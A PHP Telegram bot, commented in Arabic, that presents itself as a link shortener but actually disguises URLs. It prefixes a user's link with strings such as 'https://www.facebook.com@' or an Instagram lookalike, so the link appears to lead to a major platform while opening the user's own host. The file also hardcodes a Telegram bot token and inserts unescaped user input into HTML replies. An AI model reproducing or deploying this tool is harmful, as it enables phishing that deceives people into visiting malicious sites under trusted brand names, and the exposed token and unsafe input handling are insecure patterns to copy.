<?php
// إعدادات البوت
$botToken = "8427238398:AAGC57p638CH5_76cwOLMKiLTlTcX9dsFrc";
$website = "https://api.telegram.org/bot".$botToken;

// الروابط الأساسية - تم تصحيحها
$baseUrls = [
    'instagram' => "https://www.instagram.com._ksisie938eudhdjkew9e98eieiei@",
    'tiktok1' => "https://www.tiktok.com@", // تم التصحيح
    'instagram_reel' => "https://www.instagram.comreelDI8wzr6N9VYigsh@",
    'facebook' => "https://www.facebook.com@",
    'twitter' => "https://twitter.com@", 
    'youtube' => "https://www.youtube.com@",
    'linkedin' => "https://www.linkedin.com@",
    'telegram' => "https://t.me@",
    'whatsapp' => "https://wa.me@"
];

// تمكين تسجيل الأخطاء
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// دالة تسجيل الأخطاء
function logError($error) {
    file_put_contents('bot_errors.log', date('Y-m-d H:i:s') . " - " . $error . "\n", FILE_APPEND);
}

// الحصول على التحديث
$content = file_get_contents("php://input");
$update = json_decode($content, TRUE);

// إذا لم يكن هناك تحديث، إنهاء التنفيذ
if (!$update) {
    // للوصول المباشر للصفحة
    if (php_sapi_name() == 'cli-server') {
        echo "<h1>بوت تقصير الروابط للتليجرام</h1>";
        echo "<p>هذا البوت يعمل على تليجرام فقط. ابحث عن البوت في تليجرام لاستخدامه.</p>";
    }
    exit;
}

// معالجة الرسالة
if(isset($update['message'])) {
    $chatId = $update['message']['chat']['id'];
    $message = isset($update['message']['text']) ? $update['message']['text'] : '';
    $messageId = $update['message']['message_id'];
    
    // معالجة الأوامر
    if(strpos($message, "/start") === 0) {
        $response = "مرحباً! 👋 أنا بوت تقصير الروابط.\n\n";
        $response .= "🔹 أرسل لي أي رابط وسأعرض لك خيارات التقصير للمنصات المختلفة\n\n";
        $response .= "جرب الآن! أرسل لي رابطك 🔗";
        
        sendMessage($chatId, $response);
    }
    // إذا كان المستخدم يرسل رابط
    elseif (strpos($message, 'http') !== false || strpos($message, 'www.') !== false) {
        // حفظ الرابط مؤقتاً
        file_put_contents("link_$chatId.txt", $message);
        
        // إرسال لوحة أزرار لاختيار المنصة
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'إنستجرام 📸', 'callback_data' => 'platform_instagram'],
                    ['text' => 'تيك توك 🎵', 'callback_data' => 'platform_tiktok1']
                ],
                [
                    ['text' => 'فيسبوك 📘', 'callback_data' => 'platform_facebook'],
                    ['text' => 'تويتر 🐦', 'callback_data' => 'platform_twitter']
                ],
                [
                    ['text' => 'يوتيوب ▶️', 'callback_data' => 'platform_youtube'],
                    ['text' => 'واتساب 💚', 'callback_data' => 'platform_whatsapp']
                ],
                [
                    ['text' => 'تلجرام 📨', 'callback_data' => 'platform_telegram'],
                    ['text' => 'لينكدإن 💼', 'callback_data' => 'platform_linkedin']
                ]
            ]
        ];
        
        $response = "🔗 <b>تم استلام الرابط:</b>\n<code>$message</code>\n\n";
        $response .= "📱 <b>اختر المنصة التي تريد تقصير الرابط لها:</b>";
        
        sendMessage($chatId, $response, json_encode($keyboard));
    }
    else {
        sendMessage($chatId, "⚠️ يرجى إرسال رابط صحيح يبدأ بـ http أو https");
    }
}
// معالجة الردود على الأزرار
elseif(isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $chatId = $callback['message']['chat']['id'];
    $data = $callback['data'];
    $messageId = $callback['message']['message_id'];
    
    // الرد على الاستعلام أولاً لتجنب التأخير
    answerCallbackQuery($callback['id']);
    
    // إذا كان المستخدم يختار منصة
    if(strpos($data, 'platform_') === 0) {
        $platform = str_replace('platform_', '', $data);
        
        // جلب الرابط المحفوظ
        $linkFile = "link_$chatId.txt";
        if(file_exists($linkFile)) {
            $url = file_get_contents($linkFile);
            
            // معالجة الرابط
            $userUrl = trim($url);
            $userUrl = filter_var($userUrl, FILTER_SANITIZE_URL);
            $userUrl = preg_replace("(^https?://)", "", $userUrl);
            $userUrl = rtrim($userUrl, '/');
            
            // إنشاء الرابط الجديد
            if(isset($baseUrls[$platform])) {
                $newUrl = $baseUrls[$platform] . $userUrl;
                
                $response = "✅ <b>تم إنشاء الرابط بنجاح!</b>\n\n";
                $response .= "🔗 <b>الرابط الأصلي:</b>\n<code>$url</code>\n\n";
                $response .= "📱 <b>المنصة:</b> $platform\n";
                $response .= "🔗 <b>الرابط الجديد:</b>\n<code>$newUrl</code>\n\n";
                $response .= "انقر على الرابط لفتحه مباشرة!";
                
                // إرسال الرسالة مع زر للفتح المباشر
                $keyboard = [
                    'inline_keyboard' => [
                        [
                            ['text' => 'فتح الرابط 🔗', 'url' => $newUrl],
                            ['text' => 'إنشاء رابط آخر 🆕', 'callback_data' => 'new_link']
                        ]
                    ]
                ];
                
                // إرسال الرسالة الجديدة
                sendMessage($chatId, $response, json_encode($keyboard));
                
                // حذف الرابط المحفوظ
                unlink($linkFile);
            } else {
                sendMessage($chatId, "⚠️ عذراً، هذه المنصة غير متوفرة حالياً");
            }
        } else {
            sendMessage($chatId, "⚠️ لم أعد أتذكر الرابط، يرجى إرساله مرة أخرى");
        }
    }
    // إذا ضغط زر إنشاء رابط جديد
    elseif($data == 'new_link') {
        sendMessage($chatId, "🔗 أرسل لي الرابط الجديد الذي تريد تقصيره");
    }
}

// دالة الرد على استعلام callback
function answerCallbackQuery($callbackQueryId) {
    global $website;
    $url = $website."/answerCallbackQuery?callback_query_id=".$callbackQueryId;
    file_get_contents($url);
}

// دالة إرسال الرسالة مع معالجة الأخطاء
function sendMessage($chatId, $message, $replyMarkup = null) {
    global $website;
    
    $url = $website."/sendMessage?chat_id=".$chatId."&text=".urlencode($message)."&parse_mode=HTML";
    
    if ($replyMarkup) {
        $url .= "&reply_markup=".urlencode($replyMarkup);
    }
    
    // استخدام cURL للحصول على أداء أفضل
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); // timeout 5 ثواني
    $result = curl_exec($ch);
    
    if(curl_error($ch)) {
        logError("curl Error: " . curl_error($ch));
    }
    
    curl_close($ch);
    
    return $result;
}

// دالة حذف الرسالة
function deleteMessage($chatId, $messageId) {
    global $website;
    $url = $website."/deleteMessage?chat_id=".$chatId."&message_id=".$messageId;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}
?>